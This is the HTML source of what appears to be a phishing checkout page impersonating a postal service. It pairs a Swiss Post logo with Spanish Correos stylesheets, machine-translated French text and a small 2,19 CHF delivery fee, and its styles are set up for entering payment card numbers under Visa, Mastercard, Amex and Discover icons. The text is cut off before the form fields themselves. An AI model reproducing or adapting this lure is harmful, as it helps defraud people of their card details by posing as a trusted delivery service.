<html class="translated-ltr" lang="fr"><!--<![endif]--><head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/bundle/bootstrap-4.1.0/css/bootstrap.min.css?v=2019.12.17" media="screen">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/css/validationEngine.jquery.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/fonts/flaticon/flaticon.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/bundle/font-awesome-5/web-fonts-with-css/css/fontawesome-all.min.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/css/new-style-common-screen.css?v=2019.12.17">
		<link rel="stylesheet" href="https://tienda.correos.es/css/common-dynamic.css">
		<!--[if lt IE 9]>
			<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
			<script src="http://ie7-js.googlecode.com/svn/version/2.1(beta4)/IE9.js"></script>
		<![endif]-->
		
		
		<title>Confirmez votre demande</title>
		<meta name="description" content="En la Tienda Online de Correos tenemos todo para hacer tus envíos: cajas, sobres, sellos, embalajes... regalos, coleccionismo y productos solidarios." lang="es">
		
		
		

		<!-- Robots -->
		
		
			<meta name="robots" content="index,follow">
		
		<!-- / Robots -->
		
		<meta name="expires" content="0">
		<meta name="revisit-after" content="1 days">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="pragma" content="no-cache">

<style>
.visuallyhidden {
  border: 0;
  clip: rect(0 0 0 0);
  height: 1px;
  margin: -1px;
  overflow: hidden;
  padding: 0;
  position: absolute;
  width: 1px; }





.button {
      color: #ffffff;
    background-color: #25457d;
    padding: 3px 11px;
    font-size: 14px;
    /* letter-spacing: 1px; */
    text-transform: uppercase;
    border: 0;
    border-radius: 5px;
    outline: 0;
    -webkit-transition: all .2s;
    transition: all .2s;
    float: right;
    margin: 0px 10px;
    font-weight: bold;
}
  
  
  .button:hover, .button:active, .button:focus {
    -webkit-transform: scale(1.1);
            transform: scale(1.1); }

.button--transparent {
  background: transparent;
  border: 0;
  outline: 0; }

.button--close {
  position: absolute;
  top: 10px;
  left: 10px;
  display: -webkit-box;
  display: flex;
  -webkit-box-align: center;
          align-items: center;
  -webkit-box-pack: center;
          justify-content: center;
  width: 30px;
  height: 30px;
  color: #ffffff;
  border-radius: 50%;
  -webkit-transition: all .25s;
  transition: all .25s;
  z-index: 10; }
  .button--close svg {
    width: 20px;
    height: 20px; }
    .button--close svg * {
      fill: currentColor; }
  .button--close:hover, .button--close:active, .button--close:focus {
    color: #fbcf34;
    background-color: #ffffff;
    box-shadow: 3px 3px 20px rgba(0, 0, 0, 0.1); }

.button--info {
  position: absolute;
  top: 0;
  right: 0; }

input {
    width: calc(100% - 10px);
    min-height: 30px;
    padding-left: 5px;
    padding-right: 5px;
    letter-spacing: .5px;
    border: 0;
    background-color: #ffb45512;
    border-bottom: 2px solid #ffb45566;
}
.form-list {
  padding-left: 0;
  list-style: none; }
  .form-list__row {
    margin-bottom: 25px; }
    .form-list__row label {
      position: relative;
    display: block;
    text-transform: uppercase;
    font-weight: 600;
    font-size: 13px;
    letter-spacing: .5px;
    color: #25457d;
}
	  
	  
    .form-list__row--inline {
      display: -webkit-box;
      display: flex;
      -webkit-box-pack: justify;
              justify-content: space-between; }
      .form-list__row--inline > :first-child {
        -webkit-box-flex: 2;
                flex: 2;
        padding-right: 20px; }
      .form-list__row--inline > :nth-child(2n) {
        -webkit-box-flex: 1;
                flex: 1; }
  .form-list__input-inline {
    display: -webkit-box;
    display: flex;
    -webkit-box-pack: justify;
            justify-content: space-between; }
    .form-list__input-inline > * {
      width: calc(50% - 10px - 10px); }
  .form-list__row--agree {
    margin-top: 30px;
    margin-bottom: 30px;
    font-size: 12px; }
    .form-list__row--agree label {
      font-weight: 400;
      text-transform: none;
      color: #676767; }
    .form-list__row--agree input {
      width: auto;
      margin-right: 5px; }

#input--cc {
  position: relative;
  padding-top: 0px; }
  #input--cc input {
    padding-left: 52px;
 }
  #input--cc:before {
    content: '';
    position: absolute;
    left: 0;
    top: 50%;
    width: 36px;
    height: 45px;
    background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20glyph%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%20%3Cpath%20data-color%3D%22color-2%22%20fill%3D%22%238c8c8c%22%20d%3D%22M47%2C16V9c0-1.105-0.895-2-2-2H3C1.895%2C7%2C1%2C7.895%2C1%2C9v7H47z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%238c8c8c%22%20d%3D%22M1%2C22v17c0%2C1.105%2C0.895%2C2%2C2%2C2h42c1.105%2C0%2C2-0.895%2C2-2V22H1z%20M18%2C33H8c-0.552%2C0-1-0.448-1-1s0.448-1%2C1-1h10%20c0.552%2C0%2C1%2C0.448%2C1%2C1S18.552%2C33%2C18%2C33z%20M40%2C33h-5c-0.552%2C0-1-0.448-1-1s0.448-1%2C1-1h5c0.552%2C0%2C1%2C0.448%2C1%2C1S40.552%2C33%2C40%2C33z%22%3E%3C/path%3E%20%3C/g%3E%3C/svg%3E");
	margin: 0px 8px;
    background-position: center;
    background-repeat: no-repeat;
    background-size: 36px;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }

#input--cc.creditcard-icon--visa:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Crect%20x%3D%221%22%20y%3D%2214%22%20fill%3D%22%23E6E6E6%22%20width%3D%2246%22%20height%3D%2219%22%3E%3C/rect%3E%20%3Cpath%20fill%3D%22%23E79800%22%20d%3D%22M4%2C41h40c1.657%2C0%2C3-1.343%2C3-3v-5H1v5C1%2C39.657%2C2.343%2C41%2C4%2C41z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M44%2C7H4c-1.657%2C0-3%2C1.343-3%2C3v5h46v-5C47%2C8.343%2C45.657%2C7%2C44%2C7z%22%3E%3C/path%3E%20%3Cpolygon%20fill%3D%22%231A1876%22%20points%3D%2219.238%2C28.8%2021.847%2C28.8%2023.48%2C19.224%2020.87%2C19.224%20%22%3E%3C/polygon%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M28.743%2C23.069c-0.912-0.443-1.471-0.739-1.465-1.187c0-0.398%2C0.473-0.824%2C1.495-0.824%20c0.836-0.013%2C1.51%2C0.157%2C2.188%2C0.477l0.354-2.076c-0.517-0.194-1.327-0.402-2.339-0.402c-2.579%2C0-4.396%2C1.299-4.411%2C3.16%20c-0.015%2C1.376%2C1.297%2C2.144%2C2.287%2C2.602c1.016%2C0.469%2C1.358%2C0.769%2C1.353%2C1.188c-0.006%2C0.642-0.811%2C0.935-1.562%2C0.935%20c-1.158%2C0-1.742-0.179-2.793-0.655l-0.366%2C2.144c0.61%2C0.267%2C1.737%2C0.499%2C2.908%2C0.511c2.744%2C0%2C4.525-1.284%2C4.545-3.272%20C30.944%2C24.581%2C30.249%2C23.752%2C28.743%2C23.069z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M38.007%2C19.233H35.99c-0.625%2C0-1.092%2C0.171-1.367%2C0.794l-3.876%2C8.776h2.741c0%2C0%2C0.448-1.18%2C0.55-1.439%20c0.3%2C0%2C2.962%2C0.004%2C3.343%2C0.004c0.078%2C0.335%2C0.318%2C1.435%2C0.318%2C1.435h2.422L38.007%2C19.233z%20M34.789%2C25.406%20c0.108-0.276%2C1.173-3.011%2C1.386-3.591c0.353%2C1.651%2C0.009%2C0.049%2C0.781%2C3.591H34.789z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M17.049%2C19.231l-2.556%2C6.53l-0.272-1.327l-0.915-4.401c-0.158-0.606-0.616-0.787-1.183-0.808H7.913%20L7.88%2C19.424c1.024%2C0.248%2C1.939%2C0.606%2C2.742%2C1.05l2.321%2C8.317l2.762-0.003l4.109-9.558H17.049z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");
  margin: 0px 8px;
  }

#input--cc.creditcard-icon--master-card:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Cpath%20fill%3D%22%23003564%22%20d%3D%22M44%2C7H4c-1.657%2C0-3%2C1.343-3%2C3v28c0%2C1.657%2C1.343%2C3%2C3%2C3h40c1.657%2C0%2C3-1.343%2C3-3V10C47%2C8.343%2C45.657%2C7%2C44%2C7z%22%3E%3C/path%3E%20%3Ccircle%20fill%3D%22%23F01524%22%20cx%3D%2219%22%20cy%3D%2224%22%20r%3D%228%22%3E%3C/circle%3E%20%3Cpath%20fill%3D%22%23376BD1%22%20d%3D%22M24%2C30.24c0.093-0.075%2C0.177-0.161%2C0.267-0.24h-0.535C23.823%2C30.079%2C23.907%2C30.165%2C24%2C30.24z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FEB415%22%20d%3D%22M29%2C16c-2.525%2C0-4.773%2C1.173-6.24%2C3h2.48c0.251%2C0.313%2C0.47%2C0.651%2C0.673%2C1h-3.827h-0.008%20c-0.186%2C0.321-0.352%2C0.653-0.492%2C1h0.009h4.809c0.132%2C0.324%2C0.246%2C0.656%2C0.335%2C1h-5.477c-0.084%2C0.326-0.151%2C0.659-0.193%2C1h5.865%20C26.975%2C23.328%2C27%2C23.661%2C27%2C24h-6c0%2C0.339%2C0.028%2C0.672%2C0.069%2C1h5.865c-0.043%2C0.341-0.111%2C0.674-0.195%2C1h-5.477%20c0.088%2C0.342%2C0.194%2C0.677%2C0.325%2C1h0.009h4.809c-0.141%2C0.346-0.305%2C0.68-0.491%2C1h-3.827h-0.008c0.203%2C0.351%2C0.429%2C0.686%2C0.681%2C1h2.48%20c-0.292%2C0.363-0.623%2C0.693-0.973%2C1h-0.535h-0.012c1.409%2C1.241%2C3.254%2C2%2C5.279%2C2c4.418%2C0%2C8-3.582%2C8-8S33.418%2C16%2C29%2C16z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");     margin: 0px 8px;
}

#input--cc.creditcard-icon--american-express:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Cpath%20fill%3D%22%23007AC6%22%20d%3D%22M44%2C7H4c-1.657%2C0-3%2C1.343-3%2C3v28c0%2C1.657%2C1.343%2C3%2C3%2C3h40c1.657%2C0%2C3-1.343%2C3-3V10C47%2C8.343%2C45.657%2C7%2C44%2C7z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M10.533%2C24.429h2.33l-1.165-2.857L10.533%2C24.429z%20M43%2C19h-5.969l-1.456%2C1.571L34.264%2C19H21.598l-1.165%2C2.571%20L19.268%2C19h-5.096v1.143L13.59%2C19H9.222L5%2C29h5.096l0.582-1.571h1.456L12.716%2C29h5.678v-1.143L18.831%2C29h2.912l0.437-1.286V29%20h11.648l1.456-1.571L36.594%2C29h5.969l-3.785-5L43%2C19z%20M25.383%2C27.571h-1.602V22l-2.475%2C5.571h-1.456L17.375%2C22v5.571h-3.349%20L13.444%2C26H9.95l-0.582%2C1.571H7.475l3.057-7.143h2.475l2.766%2C6.714v-6.714h2.766l2.184%2C4.857l2.038-4.857h2.766v7.143H25.383z%20M39.797%2C27.571h-2.184l-1.893-2.429l-2.184%2C2.429h-6.552v-7.143h6.697l2.038%2C2.286l2.184-2.286h2.038L36.739%2C24L39.797%2C27.571z%20M28.586%2C21.857v1.286h3.64v1.429h-3.64V26h4.077l1.893-2.143l-1.747-2H28.586z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");     margin: 0px 8px;
}

#input--cc.creditcard-icon--discover:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Cpath%20fill%3D%22%23E6E6E6%22%20d%3D%22M47%2C23.807V10c0-1.657-1.343-3-3-3H4c-1.657%2C0-3%2C1.343-3%2C3v28c0%2C1.657%2C1.343%2C3%2C3%2C3h10.589%20C30.229%2C38.811%2C43.003%2C30.094%2C47%2C23.807z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23E6E6E6%22%20d%3D%22M47%2C38V23.807C43.003%2C30.094%2C30.229%2C38.811%2C14.589%2C41H44C45.657%2C41%2C47%2C39.657%2C47%2C38z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FA7000%22%20d%3D%22M47%2C38V23.807C43.003%2C30.094%2C30.229%2C38.811%2C14.589%2C41H44C45.657%2C41%2C47%2C39.657%2C47%2C38z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FA7000%22%20d%3D%22M25.029%2C21.013c-1.69%2C0-3.062%2C1.32-3.062%2C2.951c0%2C1.734%2C1.312%2C3.028%2C3.062%2C3.028%20c1.708%2C0%2C3.054-1.313%2C3.054-2.995C28.084%2C22.325%2C26.747%2C21.013%2C25.029%2C21.013z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M7.646%2C21.121H6v5.743h1.636c0.871%2C0%2C1.499-0.207%2C2.05-0.664c0.654-0.541%2C1.043-1.359%2C1.043-2.206%20C10.728%2C22.298%2C9.462%2C21.121%2C7.646%2C21.121z%20M8.956%2C25.434c-0.356%2C0.318-0.81%2C0.457-1.535%2C0.457H7.121v-3.798h0.301%20c0.725%2C0%2C1.161%2C0.13%2C1.535%2C0.464c0.385%2C0.345%2C0.617%2C0.878%2C0.617%2C1.429C9.573%2C24.539%2C9.342%2C25.091%2C8.956%2C25.434z%22%3E%3C/path%3E%20%3Crect%20x%3D%2211.245%22%20y%3D%2221.121%22%20fill%3D%22%23444444%22%20width%3D%221.116%22%20height%3D%225.743%22%3E%3C/rect%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M15.102%2C23.322c-0.674-0.247-0.871-0.412-0.871-0.722c0-0.361%2C0.352-0.635%2C0.836-0.635%20c0.335%2C0%2C0.612%2C0.134%2C0.906%2C0.462l0.583-0.764c-0.481-0.424-1.058-0.638-1.686-0.638c-1.016%2C0-1.791%2C0.707-1.791%2C1.642%20c0%2C0.794%2C0.36%2C1.197%2C1.411%2C1.579c0.439%2C0.153%2C0.662%2C0.257%2C0.776%2C0.328c0.224%2C0.145%2C0.335%2C0.352%2C0.335%2C0.592%20c0%2C0.467-0.37%2C0.811-0.871%2C0.811c-0.533%2C0-0.964-0.267-1.222-0.768l-0.722%2C0.7c0.516%2C0.756%2C1.135%2C1.094%2C1.988%2C1.094%20c1.163%2C0%2C1.982-0.778%2C1.982-1.887C16.757%2C24.202%2C16.377%2C23.788%2C15.102%2C23.322z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M17.108%2C23.994c0%2C1.689%2C1.326%2C2.998%2C3.032%2C2.998c0.481%2C0%2C0.894-0.095%2C1.402-0.335v-1.32%20c-0.449%2C0.451-0.843%2C0.629-1.353%2C0.629c-1.128%2C0-1.927-0.816-1.927-1.98c0-1.1%2C0.825-1.972%2C1.877-1.972%20c0.531%2C0%2C0.937%2C0.188%2C1.402%2C0.646v-1.318c-0.491-0.248-0.894-0.351-1.379-0.351C18.467%2C20.991%2C17.108%2C22.325%2C17.108%2C23.994z%22%3E%3C/path%3E%20%3Cpolygon%20fill%3D%22%23444444%22%20points%3D%2230.617%2C24.977%2029.086%2C21.121%2027.864%2C21.121%2030.299%2C27.009%2030.9%2C27.009%2033.382%2C21.121%2032.17%2C21.121%20%22%3E%3C/polygon%3E%20%3Cpolygon%20fill%3D%22%23444444%22%20points%3D%2233.89%2C26.864%2037.066%2C26.864%2037.066%2C25.891%2035.011%2C25.891%2035.011%2C24.341%2036.988%2C24.341%2036.988%2C23.368%2035.011%2C23.368%2035.011%2C22.093%2037.066%2C22.093%2037.066%2C21.121%2033.89%2C21.121%20%22%3E%3C/polygon%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M41.5%2C22.815c0-1.076-0.738-1.695-2.031-1.695h-1.664v5.743h1.123v-2.309h0.146l1.547%2C2.309H42l-1.807-2.421%20C41.037%2C24.271%2C41.5%2C23.694%2C41.5%2C22.815z%20M39.254%2C23.762h-0.325v-1.737h0.343c0.7%2C0%2C1.075%2C0.294%2C1.075%2C0.853%20C40.347%2C23.452%2C39.972%2C23.762%2C39.254%2C23.762z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");     margin: 0px 8px;
}

.modal {
  display: -webkit-box;
 display: flex; 

  z-index: 100; 
overflow-y: auto;
}
  .modal__container {
    display: -webkit-box;
    display: flex;
    max-width: 100%;
    min-height: 370px;
    background-color: #ffffff;
    border-radius: 5px;
    box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.0); }
  .modal__featured {
    position: relative;
    -webkit-box-flex: 1;
            flex: 1;
    min-width: 230px;
    padding: 20px;
    overflow: hidden;
    border-top-left-radius: 0px;
    border-bottom-left-radius: 0px; }
  .modal__circle {
    position: absolute;
    top: 0;
    left: 0;
    height: 200%;
    width: 200%;
    background-image: linear-gradient(#00b3ea , #01279a 70%);
    border-radius: 50%;
    -webkit-transform: translateX(-50%) translateY(-25%);
            transform: translateX(-50%) translateY(-25%); }
  .modal__product {
    position: absolute;
    top: 0;
    left: 50%;
    max-width: 85%;
    -webkit-transform: translateX(calc(-50% - 10px));
            transform: translateX(calc(-50% - 10px)); }
  .modal__content {
    -webkit-box-flex: 3;
            flex: 3;
    padding: 20px 20px; }
	
	
	
input {
    width: calc(100% - 10px);
    min-height: 43px;
    padding-left: 5px;
    padding-right: 5px;
    letter-spacing: .5px;
    border: 0;
    background-color: #f8f8f8;
    border: 1px solid #bfbfbf;
    border-radius: 5px;
}



.checkout-box {
    padding: 0;
    background: #ffffff;
}


</style>
		
		
		
		

		
	<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>

	<body class="common-screen-body" style="background-image: linear-gradient(#fcfbf7, #fcfbf7);">
	
		 			<!-- Google Tag Manager -->
			
		
		
		<section class="common-screen-header">
    
			<nav class="navbar navbar-expand-md navbar-light" style="/*! background: #7171c1; */background-image: linear-gradient(#fdfcf8, #fcfbf7);">
				<img class="ppm-main-navigation__logo-image" src="https://www.post.ch/-/media/portal-opp/global/logos/logo---die-post.svg?vs=2&amp;sc_lang=en" alt="Logo Die Post, To the homepage">
			    <a class="navbar-brand" href="/"></a>
			    
			    
			    
			    
				<br style="background: blue;">
<br>
<div class="collapse navbar-collapse" id="common-screen-top-navbar">
					<div class="navbar-nav ml-auto">
						

							
								<a class="nav-item nav-link" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Montez</font></font></font></font></font></font></font></font></font></font></a>					
								<a class="nav-item nav-link" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></font></font></font></a>
							

						
						
						

						
						<a class="nav-item nav-link" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Panier</font></font></font></font></font></font></font></font></font></font></a>
						
						
						

						
				        
				    </div>
			    </div>
			</nav>
		</section>
		
		<section class="common-screen-content">
			



<section class="go-back-to-shop">
	<div class="container">
		<ul class="nav">
			<li class="nav-item">
				
			</li>
		</ul>
	</div>
</section>

<section class="checkout-template" style="/*! background: #757171; *//*! background-image: linear-gradient(yellow, #fff); */background-image: linear-gradient(#fcfbf7, #fcfbf7);">
	<div class="container">
	
		<div class="cart-no-product-alert" style="display:none"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vous n'avez aucun article dans votre panier</font></font></font></font></font></font></font></font></font></font></div>
	


<!--null
-->

		<div class="alert alert-danger alert-error alert-dismissable shopping-cart-alert" style="display:none"><button type="button" class="close" data-dismiss="alert"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X</font></font></font></font></font></font></button><strong></strong></div>
		<!-- Mobile version Summary of the cart -->
		<div class="checkout-mobile-summary">




<div class="checkout-summary-fixed d-block d-lg-none">
	<div class="row">
		
	</div>
	<!-- summary checkout mobile -->
	<div class="summary-checkout">
		<div class="summary-product-thumbs row">
		
		
			
			
		
		</div>
		<hr>
		<div class="row">
			<div class="col">
				<span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Le total</font></font></font></font></font></font></font></font></font></font></span>
			</div>
			<div class="col text-right">
				<span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2,19 CHF</font></font></font></font></font></font></font></font></span>
			</div>
		</div>
		
	</div>
	<!-- /summary checkout mobile -->
</div></div>
		<!-- Mobile version Summary of the cart -->
	
		<div class="row flex-column-reverse flex-lg-row">
			<div class="col-lg-7" style="/*! background: #7b6f6f; */">
				<div class="checkout-left-side">
					<div id="cartParent" style="opacity: 1;">
						<div id="shippingZoneLocked" class="shopping-cart-locked-parent" style="display: block;">


</div>
						<div id="shippingZoneForm" class="shopping-cart-form-parent" style="display: none;">



</div>
					
						<div id="carrierLocked" class="shopping-cart-locked-parent" style="display: block;">




<section class="checkout-small-shipping-type small-box">
	
	<div class="small-box-content">
		
		<div class="title">
			<div class="title-content">
				<div class="title-icon">
					<i class="flaticon-package"></i>
				</div>
				<div class="title-text">
					<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shipping Code: CH / 81 ******</font></font></font></font></font></font></font></font></h4>
					<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></font></font></font></p>
					
					 
				</div>
			</div>
		</div>
		<div class="buttons">
			<button class="btn btn-primary modify-button btn-edit-carrier">
				<span class="d-none d-sm-none d-md-block"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Réponse rapide à votre demande</font></font></font></font></font></font></font></font></font></font></span>
				<span class="d-block d-sm-block d-md-none"><i class="fas fa-edit"></i></span>
			</button>
		</div>
	</div>
</section>
</div>
						<div id="carrierFormParent" class="shopping-cart-form-parent" style="display: none;">



<section class="checkout-shipping-type">
	<div class="checkout-box">	
		
		<div class="checkout-box-title">
			<div class="checkout-box-title-icon"><i class="flaticon-package"></i></div>
			<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code d'expédition: UK / 2938456</font></font></font></font></font></font></font></font></font></font></h4>
		</div>
		<div class="checkout-box-content">
			<div class="checkout-shipping-type-content">
				
				
					<form id="carrierForm" method="post" action="/cart/changecarrier" class="">
						<input type="hidden" name="carrierid" id="carrierid" value="3">
						<input type="hidden" name="isselfpick" id="isselfpick" value="0">
						<input type="hidden" name="selfpickstorecode" id="selfpickstorecode" value="">
						<input type="hidden" name="homepaqtoken" id="homepaqtoken" value="">
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar" src="https://cdn.mycomandia.com/static/logos/correos-paq-72-mini.png">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
											<input type="checkbox" id="carrierselection3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="0">
											<label class="custom-control-label" for="carrierselection3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
												Chez vous </font></font></font></font></font></font></font></font></font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(2,99 EUR)</font></font></font></font></font></font></font></font></font></font></strong>
											</label>
										
									</div>
								
								
								
									<div class="custom-control custom-checkbox form-check office-nodelivery-container">
										
										<input type="checkbox" id="carrierselection_self3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="1" data-postalcode="39999" data-is-pickup-at-shop="0">
										<label class="custom-control-label" for="carrierselection_self3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
										
											Retrait à la poste </font></font></font></font></font></font></font></font></font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(2,99 EUR)</font></font></font></font></font></font></font></font></font></font></strong>
										
										</label>
										
										
									<!-- Correos hidden offices -->
										
										<div class="offices-search-container" style="display:none">
											<!-- <div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office1">
												<label class="custom-control-label" for="Office1">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div>
											<div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office2">
												<label class="custom-control-label" for="Office2">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div> -->
										</div>
									<!-- Correos hidden offices -->
										
									</div>
								
								
							</div>
							<div style="width:100%">
								
